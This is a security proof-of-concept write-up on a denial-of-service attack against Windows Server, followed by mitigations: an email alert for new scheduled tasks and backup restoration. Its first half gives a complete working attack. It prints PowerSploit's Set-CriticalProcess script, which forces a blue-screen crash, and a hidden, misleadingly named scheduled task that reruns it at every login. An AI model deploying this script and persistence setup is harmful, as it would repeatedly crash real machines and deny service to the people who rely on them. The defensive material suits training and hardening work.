# POC 3 - Denial of Service Attack on Boot Up of Device

## Description

Denial of Service (DoS) attack is an attack that affects the availability of services towards the users. While availability can be restored, if a prolonged attack occurs, systems may be damaged. 

The Windows Server hosts numerous features and services that organizations can leverage. This includes, but is not limited to, Active Directory, File and Storage Services, web services, and more. 

When a DoS attack is launched on these services, organisations are widely affected as these services play an important role and service towards the organisation.  

This attack aims to outline the threats posed to the organisation from a Denial of Service attack making use of a PowerShell script extracted from the PowerSploit module. 

## Steps to Carry Out Exploitation

1. Create a script with the following content and save it in a file locations where it will seem normal


File Location:

```
C:\Users\$username\Documents\WindowsPowerShell\Scripts\InstalledScriptInfos
```

File Name:

```
Startup.ps1
```

Script Content: 

```ps1
function Set-CriticalProcess
{
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'High')]
    Param (
        [Switch]
        $Force,

        [Switch]
        $ExitImmediately
    )

    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        throw 'You must run Set-CriticalProcess from an elevated PowerShell prompt.'
    }

    $Response = $True

    if (!$Force)
    {
        $Response = $psCmdlet.ShouldContinue('Have you saved all your work?', 'The machine will blue screen when you exit PowerShell.')
    }

    if (!$Response)
    {
        return
    }

    $DynAssembly = New-Object System.Reflection.AssemblyName('BlueScreen')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('BlueScreen', $False)

    # Define [ntdll]::NtQuerySystemInformation method
    $TypeBuilder = $ModuleBuilder.DefineType('BlueScreen.Win32.ntdll', 'Public, Class')
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('NtSetInformationProcess',
    'ntdll.dll',
    ([Reflection.MethodAttributes] 'Public, Static'),
    [Reflection.CallingConventions]::Standard,
    [Int32],
    [Type[]] @([IntPtr], [UInt32], [IntPtr].MakeByRefType(), [UInt32]),
    [Runtime.InteropServices.CallingConvention]::Winapi,
    [Runtime.InteropServices.CharSet]::Auto)

    $ntdll = $TypeBuilder.CreateType()

    $ProcHandle = [Diagnostics.Process]::GetCurrentProcess().Handle
    $ReturnPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4)

    $ProcessBreakOnTermination = 29
    $SizeUInt32 = 4

    try
    {
        $null = $ntdll::NtSetInformationProcess($ProcHandle, $ProcessBreakOnTermination, [Ref] $ReturnPtr, $SizeUInt32)
    }
    catch
    {
        return
    }

    Write-Verbose 'PowerShell is now marked as a critical process and will blue screen the machine upon exiting the process.'

    if ($ExitImmediately)
    {
        Stop-Process -Id $PID
    }
}

Set-CriticalProcess -Force -Verbose -ExitImmediately
```

2. Schedule a task using `Task Scheduler` to run this script on startup of device

**General Tab**
|Options|Value|
|--|--|
|Name|Startup Application|
|Description|A script to Startup application dependencies|
|Use the user account|Default User Selected|
|When to Run|Run only when user is logged on|
|Run with highest privileges|Checked|
|Configure for|Windows Server 2022|
|Hidden|Checked|

![Task Scheduler General Options](/images/POC_3/Exploitation/POC3_Task_Scheduler_General.png)

**New Trigger Tab**
|Options|Value|
|--|--|
|Begin the task|On workstation unlock of any user|
|Enabled|Checked|

![Task Scheduler New Trigger Options](/images/POC_3/Exploitation/POC3_Task_Scheduler_New_Trigger.png)

**New Action Tab**
|Options|Value|
|--|--|
|Action|Start a program|
|Program/script|C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe|
|Add arguments (optional)|-WindowStyle hidden -File "C:\Users\CARR0T\Documents\WindowsPowerShell\Scripts\InstalledScriptInfos\Startup.ps1"|

![Task Scheduler New Actions Options](/images/POC_3/Exploitation/POC3_Task_Scheduler_New_Actions.png)

**Conditions Tab**
|Options|Value|
|--|--|
|Start the task only if the computer is on AC power|Unchecked|

![Task Scheduler Condition Options](/images/POC_3/Exploitation/POC3_Task_Scheduler_Conditions.png)

**Settings Tab**
|Options|Value|
|--|--|
|Allow Task to be run on demand|Checked|
|Run tasks as soon as possible after a scheduled start is missed|Checked|
|If the task fails, restart every|1 minute|
|Attempt to restart up to|3 times|
|Stop the task if it runs longer than|3 days|
|If the running task does not end when requested, force it to stop|Checked|
|If the task is not scheduled to run again, delete it after|Unchecked|
|If the task is already running, than the following rules applies|Do not start a new instance|

![Task Scheduler Settings Options](/images/POC_3/Exploitation/POC3_Task_Scheduler_Settings.png)

3. Run the script

4. Notice that the device keeps getting a Blue Screen of Death (BSOD) when the user logs in

![Blue Screen of Death](/images/POC_3/Exploitation/POC3_BSOD.png)

## Possible Mitigations and Recommendations

1. [Notify Administrators of New Scheduled Tasks](#notify-administrators-of-new-scheduled-tasks)
2. [Backup Device and Roll Back Machine](#backup-device-and-roll-back-machine)
3. Installing anti-DoS software or hardware

### Notify Administrators of New Scheduled Tasks

While tasks are being constantly scheduled within systems to perform an update of system, scanning for malicious files, etc., threat actors can make use of scheduled tasks as an advantage to schedule exploits to run on start up or at different times of the day. 

To combat this, one method is to notify the administrators of any new scheduled tasks to allow administrators to further look into and investigate any newly scheduled task which may pose a potential threat towards the organisations active directory. 

#### Steps to Notify Administrators of New Scheduled Tasks

1. Create a PowerShell script like the following modifying the information accordingly

```ps1
# Define the event ID to monitor for task creation
$EventId = 106

# Get the latest event that matches the specified event ID from the Task Scheduler log
$Event = Get-WinEvent -MaxEvents 1 -FilterHashTable @{
    LogName = 'Microsoft-Windows-TaskScheduler/Operational'
    ID = $EventId
} | Select-Object Id, Message, MachineName, ProviderName

# Check if an event is found
if ($Event) {
    # Email configuration
    $EmailFrom = "your-email@example.com"
    $EmailTo = "recipient@example.com"
    $Subject = "Task Created Alert - $($Event.MachineName)"
    $Body = "EventID: $($Event.Id)`nSource: $($Event.ProviderName)`nMachineName: $($Event.MachineName)`nMessage: $($Event.Message)"

    # SMTP Server configuration for a generic mail server
    $SMTPServer = "mail.example.com"
    $SMTPPort = 587
    $SMTPUsername = "your-email@example.com"
    $encrypted = Get-Content c:scriptsencrypted_password.txt | ConvertTo-SecureString
    $credential = New-Object System.Management.Automation.PsCredential($SMTPUsername, $encrypted)

    # Create and configure the SMTP client
    $SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
    $SMTPClient.EnableSsl = $true
    $SMTPClient.Credentials = $credential

    # Send the email
    $SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)

    Write-Host "Email sent successfully."
} else {
    Write-Host "No matching event found."
}
```

2. Test that the email is able to be sent by running the PowerShell Script

3. Open `Event Viewer` and navigate to the following path `Applications and Services > Microsoft > Windows > Task Scheduler > Operational`

![Event Viewer Task Scheduler Operational Tab](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Event_Viewer_Task_Scheduler_Operational_Tab.png)

4. Filter the current log to show all logs with an `Event ID` of `106`

![Filtering Event Log with Event ID 106](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Event_Viewer_Filter_By_Event_ID.png)

![Filtered Event Log](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Event_Viewer_Filtered_Log.png)

5. Right Click the Task and `Attach Task To This Event`

![Right Click Options](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Event_Viewer_Task_Options.png)

6. Create the task with the following details

**General Tab**
|Options|Value|
|--|--|
|Name|NewScriptAlert|
|Description|Alert Administrators of any new scripts created|

![Creating Basic Task](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Creating_Basic_Task.png)

**New Action Tab**
|Options|Value|
|--|--|
|Action|Start a program|
|Program/script|C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe|
|Add arguments (optional)|<Path/To/File>|

![Task Scheduler Actions Options](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Basic_Task_Scheduler_Actions.png)

7. Verify that the settings are configured as per follows

![Task Scheduler Summary](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Basic_Task_Scheduler_Summary.png)

8. Check the `Open Properties dialog for the task when I click Finish` option

9. Further modify the following from the properties dialog

**General Tab**

![Task Scheduler General](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Task_Scheduler_General.png)

**Conditions Tab**

![Task Scheduler Conditions](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Task_Scheduler_Conditions.png)

**Settings Tab**

![Task Scheduler Settings](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Task_Scheduler_Settings.png)

**Account Login Prompt**

![Task Scheduler Account Login](/images/POC_1/Mitigation/Notify_New_Tasks/POC1_Task_Scheduler_Account_Login.png)

10. Trigger the task and check that an email notification is triggered

### Backup Device and Roll Back Machine

The backing up of device allows users to quickly rollback the system to the last usable backup. While the threat actor may attempt to damage the system, if a backup is made, the system can easily be rolled back. 

#### Steps to Backup Device and Roll Back Machine
1. Bootup the device and enter the `advanced options menu` by pressing the `SHIFT` key while booting up device

2. Click the `Troubleshoot` option

![Advanced Options Menu](/images/POC_3/Mitigations/Backup_and_Rollback/POC3_Troubleshoot.png)

3. Click System Image Recovery

![Advanced Options Menu](/images/POC_3/Mitigations/Backup_and_Rollback/POC3_System_Image_Recovery.png)

4. Insert the external device with the backup image and follow the instructions to restore the system to the last working system backup

![Reimage Device Prompt](/images/POC_3/Mitigations/Backup_and_Rollback/POC3_Reimage_Device.png)

## References

[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)  
[Running PowerShell Script without displaying Window](https://stackoverflow.com/questions/1802127/how-to-run-a-powershell-script-without-displaying-a-window)  
[Start your PC in safe mode in Windows](https://support.microsoft.com/en-us/windows/start-your-pc-in-safe-mode-in-windows-92c27cff-db89-8644-1ce4-b3e5e56fe234)  
